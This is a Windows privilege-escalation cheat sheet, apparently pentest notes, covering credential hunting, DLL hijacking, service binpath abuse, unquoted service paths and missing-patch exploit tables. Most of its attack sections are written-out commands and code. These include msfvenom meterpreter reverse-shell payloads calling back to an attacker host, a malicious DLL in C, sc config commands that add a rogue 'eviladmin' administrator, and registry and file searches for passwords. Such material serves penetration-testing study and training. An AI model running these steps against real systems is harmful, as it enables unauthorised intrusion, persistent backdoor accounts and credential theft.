# Windows Privilege Escalation

Two types of privilege escalation:

* Vertical
* Horizontal

### Information Gathering

Find out OS Name and Version:

```text
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ver
```

Hostname:

`hostname`

Username:

```text
whoami
echo %username
```

Check user privilege \(check if belong to admin group\):

```text
net user [user]
```

Network:

`ipconfig /all`

### Searching for Password in Configuration files

Clear-text passwords

```text
c:\unattend.txt
c:\sysprep.ini - [Clear Text]
c:\sysprep\sysprep.xml - [Base64]
```

The command below will search the file system for file names containing certain keywords

`dir /s *pass* == *cred* == *vnc* == *.config*`

Search certain file types for a keyword, this can generate a lot of output.

`findstr /si password *.xml *.ini *.txt`

Similarly the two commands below can be used to grep the registry for keywords, in this case "password".

```text
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### DLL Hijacking

```text
When a process attempts to load a DLL, the system searches directories in the following order:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```


1. List all the processes on the system and discover processes which are running as SYSTEM and are missing DLL’s using process monitor tool (Sysinternals)

```text
Result is NAME NOT FOUND
Path ends with dll
```

2. Identify a writable location (folder) (directory from which the application is loaded, PATH environment variables)
```text
C:\> icacls [path]
```

3. Use msfvenom to generate a DLL that contains a payload or compile the following dll

msfvenom

```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={attack ip} LPORT={attack port} -f dll > output.dll
```

C code

```text
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt"); //payload here
        ExitProcess(0);
    }
    return TRUE;
}
```
4. Rename the dll to the name of the missing dll and drop it to one of the folders that windows are loading DLL files 

5. Restart the process

```text
kill [pid]
```
Or, if cannot restart the process, then restart the machine

```text
shutdown /r /t 0
```
6. Fire up a handler to catch the shell

Alternatively, we can use powersploit to complete the task

```text
Find-ProcessDLLHijack //identify all the processes on the system that are trying to load DLL which are missing
Find-PathDLLHijack //identification of path that user can modify the content
Write-HijackDll //generate the hijackable DLL
```

### binpath (Insecure Service Permissions)

1. Upload AccessChk (Sysinternals) to the computer

```text
accesschk.exe -uwcqv "testuser" *
```

```text
Accesschk v6.02 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
RW Vulnerable Service
 SERVICE_ALL_ACCESS
```

All services that “testuser” can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service.

2. View the properties of the services

```text
C:\Users\testuser\AppData\Local\Temp>sc qc "Vulnerable Service"
sc qc "Vulnerable Service"
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: Vulnerable Service
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
        LOAD_ORDER_GROUP   : UIGroup
        TAG                : 0
        DISPLAY_NAME       : Vulnerable Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
BINARY_PATH_NAME points to Executable.exe which is executable file for this service. If we change this value with any command means this command will run as SYSTEM at the next start of the service.

3. Config the service to run a command we want (e.g. create a user)

```text
sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add"
```

4. Restart service

```text
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

5. Config the service to run another command (e.g. add the user to the local admin group)

```text
sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"
```

Alternatively, we can use metasploit module

```text
exploit/windows/local/service_permissions
```

### Unquoted Path

When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:

```text
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
```

If we can drop our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as SYSTEM. But we should have necessary privileges on one of these folders.

1. Identify all unquoted service path

```text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

2. Check which folder we have the permission to drop our executable on with icacls

```text
C:\> icacls [path]
```

```text
F = Full Control
CI = Container Inherit – This flag indicates that subordinate containers will inherit this ACE.
OI = Object Inherit – This flag indicates that subordinate files will inherit the ACE.
```

3. Use msfvenom to generate a exe  

```text
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
```

4. Restart the machine to restart the vulnerable services

```text
shutdown /r /t 0
```

5. Start a handler ```exploit/multi/handler``` to catch the shell

Alternatively we can use metasploit

```text
exploit/windows/local/trusted_service_path
```


### Discovery of Missing Patches

**By CMD**

```text
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3136041" /C:"KB4018483"
```

**By Metasploit**

`use post/windows/gather/enum_patches`

**By PowerShell \(Sherlock\)**

`PS C:\Users\User > Find-AllVulns`

## Tools

#### PowerUp

## Privilege Escalation Exploit Table

**Privilege Escalation Table \(Due to lack of sufficient patching\)**

| OS | Description | Security Bulletin | KB | Exploit |
| :--- | :--- | :--- | :--- | :--- |
| Windows Server 2016 | Windows Kernel Mode Drivers | [MS16-135](https://technet.microsoft.com/en-us/library/security/ms16-135.aspx) | 3199135 | [Exploit](https://github.com/mwrlabs/CVE-2016-7255)[Github](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1) |
| Windows Server 2008 ,7,8,10 Windows Server 2012 | Secondary Logon Handle | [MS16-032](https://technet.microsoft.com/en-us/library/security/ms16-032.aspx) | 3143141 | [GitHub](https://github.com/khr0x40sh/ms16-032)[ExploitDB](https://www.exploit-db.com/exploits/39719/)[Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc) |
| Windows Server 2008, Vista, 7 | WebDAV | [MS16-016](https://technet.microsoft.com/en-us/library/security/ms16-016.aspx) | 3136041 | [Github](https://github.com/koczkatamas/CVE-2016-0051) |
| Windows Server 2003, Windows Server 2008, Windows 7, Windows 8, Windows 2012 | Windows Kernel Mode Drivers | [MS15-051](https://technet.microsoft.com/en-us/library/security/ms15-051.aspx) | 3057191 | [GitHub](https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou32.exe)[ExploitDB](https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37049-32.exe)[Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms15_051_client_copy_image) |
| Windows Server 2003, Windows Server 2008, Windows Server 2012, 7, 8 | Win32k.sys | [MS14-058](https://technet.microsoft.com/en-us/library/security/ms14-058.aspx) | 3000061 | [GitHub](https://github.com/sam-b/CVE-2014-4113)[ExploitDB](https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39666.zip)[Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu) |
| Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 | AFD Driver | [MS14-040](https://technet.microsoft.com/en-us/library/security/ms14-040.aspx) | 2975684 | [Python](http://bhafsec.com/files/windows/MS14-40-x32.py)[EXE](http://bhafsec.com/files/windows/MS14-40-x32.exe)[ExploitDB](https://www.exploit-db.com/exploits/39446/)[Github](https://github.com/JeremyFetiveau/Exploits/blob/master/MS14-040.cpp) |
| Windows XP, Windows Server 2003 | Windows Kernel | [MS14-002](https://technet.microsoft.com/en-us/library/security/ms14-002.aspx) | 2914368 | [Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms_ndproxy) |
| Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 | Kernel Mode Driver | [MS13-005](https://technet.microsoft.com/en-us/library/security/ms13-005.aspx) | 2778930 | [Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms13_005_hwnd_broadcast)[ExploitDB](https://www.exploit-db.com/exploits/24485/)[GitHub](https://github.com/0vercl0k/stuffz/blob/master/ms13-005-funz-poc.cpp) |
| Windows Server 2008, 7 | Task Scheduler | [MS10-092](https://technet.microsoft.com/en-us/library/security/ms10-092.aspx) | 2305420 | [Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms10_092_schelevator)[ExploitDB](https://www.exploit-db.com/exploits/15589/) |
| Windows Server 2003, Windows Server 2008, 7, XP | KiTrap0D | [MS10-015](https://technet.microsoft.com/en-us/library/security/ms10-015.aspx) | 977165 | [Exploit](http://bhafsec.com/files/windows/KiTrap0d.zip)[ExploitDB](https://www.exploit-db.com/exploits/11199/)[GitHub](https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/11199.zip)[Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms10_015_kitrap0d) |
| Windows Server 2003, XP | NDProxy | [MS14-002](https://technet.microsoft.com/en-us/library/security/ms14-002.aspx) | 2914368 | [Exploit](http://bhafsec.com/files/windows/MS14-002.exe)[ExploitDB](https://www.exploit-db.com/exploits/30014/)[ExploitDB](https://www.exploit-db.com/exploits/37732/)[Github](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/MS14-002/MS14-002.c) |
| Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 | Kernel Driver | [MS15-061](https://technet.microsoft.com/en-us/library/security/ms15-061.aspx) | 3057839 | [Github](https://github.com/Rootkitsmm/MS15-061) |
| Windows Server 2003, XP | AFD.sys | [MS11-080](https://technet.microsoft.com/en-us/library/security/ms11-080.aspx) | 2592799 | [EXE](http://bhafsec.com/files/windows/ms110-080.exe)[Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms11_080_afdjoinleaf)[ExploitDB](https://www.exploit-db.com/exploits/18176/) |
| Windows Server 2003, XP | NDISTAPI | [MS11-062](https://technet.microsoft.com/en-us/library/security/ms11-062.aspx) | 2566454 | [ExploitDB](https://www.exploit-db.com/exploits/40627/) |
| Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 | RPC | [MS15-076](https://technet.microsoft.com/en-us/library/security/ms15-076.aspx) | 3067505 | [Github](https://github.com/monoxgas/Trebuchet) |
| Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012 | Hot Potato | [MS16-075](https://technet.microsoft.com/en-us/library/security/ms16-075.aspx) | 3164038 | [GitHub](https://github.com/foxglovesec/RottenPotato)[PowerShell](https://github.com/Kevin-Robertson/Tater)[HotPotato](https://github.com/foxglovesec/Potato) |
| Windows Server 2003, Windows Server 2008, 7, XP | Kernel Driver | [MS15-010](https://technet.microsoft.com/en-us/library/security/ms15-010.aspx) | 3036220 | [GitHub](https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39035.zip)[ExploitDB](https://www.exploit-db.com/exploits/37098/) |
| Windows Server 2003, Windows Server 2008, 7, XP | AFD.sys | [MS11-046](https://technet.microsoft.com/en-us/library/security/ms11-046.aspx) | 2503665 | [EXE](http://bhafsec.com/files/windows/ms11-046.exe)[ExploitDB](https://www.exploit-db.com/exploits/40564/) |

### Privilege Escalation Exploit

| Exploit-DB | Vul Name | MS\# | 2000 | XP | 2003 | 2008 | Vista | 7 |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 271 | Lsasrv.dll | MS04-011 | SP2/3/4 | SP0/1 | - | - | - | - |
| 350 | Util Manager | MS04-019 | SP2/3/4 | - | - | - | - | - |
| 351 | POSIX | MS04-020 | SP4 | - | - | - | - | - |
| 352 | Univ lang. Util Mgr | MS04-019 | SP2/3/4 | - | - | - | - | - |
| 355 | Univ lang. Util Mgr | MS04-019 | SP2/3/4 | - | - | - | - | - |
| 1149 | PnP Service | MS05-039 | SP4 | SP2 | SP1 | - | - | - |
| 1197 | keybd\_event | - | all | all | all | - | - | - |
| 1198 | CSRSS | MS05-018 | SP3/4 | SP1/2 | - | - | - | - |
| 1407 | Kernel APC | MS05-055 | SP4 | - | - | - | - | - |
| 1911 | Mrxsmb.sys | MS06-030 | all | SP2 | - | - | - | - |
| 2412 | Windows Kernel | MS06-049 | SP4 | - | - | - | - | - |
| 3220 | Print spool service | - | - | All | - | - | - | - |
| 5518 | win32k.sys | MS08-025 | SP4 | SP2 | SP1/SP2 | SP0 | SP0/SP1 | - |
| 6705 | Churrasco | MS09-012 | - | - | All | - | - | - |
| 6705 | Churraskito | - | - | All | All | - | - | - |
| 21923 | Winlogon NetDDE | - | All | All | - | - | - | - |
| 11199 | KiTrap0D/vdmallowed | MS10-015 | All | All | All | All | All | All |
| 14610 | Chimichurri | MS10-059 | - | - | - | All | All | SP0 |
| 15589 | Task Scheduler | MS10-092 | - | - | - | SP0/SP1/SP2 | SP1/SP2 | SP0 |
| 18176 | AFD.Sys | MS11-080 | - | SP3 | SP3 | - | - | - |
|  |  | MS13-005 |  |  |  |  |  |  |
|  |  | MS13-081 |  |  |  |  |  |  |
|  |  | MS14-058 |  |  |  |  |  |  |
|  |  | MS14-068 |  |  |  |  |  |  |
|  |  | MS14-070 |  |  |  |  |  |  |
|  |  | MS15-051 |  |  |  |  |  |  |
|  |  | MS15-052 |  |  |  |  |  |  |

### Useful Link

{% embed data="{\"url\":\"https://github.com/Hack-with-Github/Windows\",\"type\":\"link\",\"title\":\"Hack-with-Github/Windows\",\"description\":\"Awesome tools to exploit Windows ! Contribute to Hack-with-Github/Windows development by creating an account on GitHub.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://github.com/fluidicon.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://avatars0.githubusercontent.com/u/18143746?s=400&v=4\",\"width\":400,\"height\":400,\"aspectRatio\":1}}" %}

{% embed data="{\"url\":\"http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/\",\"type\":\"link\",\"title\":\"Penetration Testing 102 - Windows Privilege Escalation - Cheatsheet\",\"description\":\"Consulting services for penetration testing, exploitation, exploitation  training, technical training, reverse engineering, custom fabrication,  hardware and software exploit development, and security research. We offer  a variety of highly technical services and solve difficult technical  problems with practical, robust solutions.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://static1.squarespace.com/static/557377e6e4b0976301e02e0f/t/55748695e4b0061829d7c800/favicon.ico\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"https://github.com/SecWiki/windows-kernel-exploits\",\"type\":\"link\",\"title\":\"SecWiki/windows-kernel-exploits\",\"description\":\"windows-kernel-exploits   Windows平台提权漏洞集合. Contribute to SecWiki/windows-kernel-exploits development by creating an account on GitHub.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://github.com/fluidicon.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://avatars0.githubusercontent.com/u/11382397?s=400&v=4\",\"width\":75,\"height\":75,\"aspectRatio\":1}}" %}

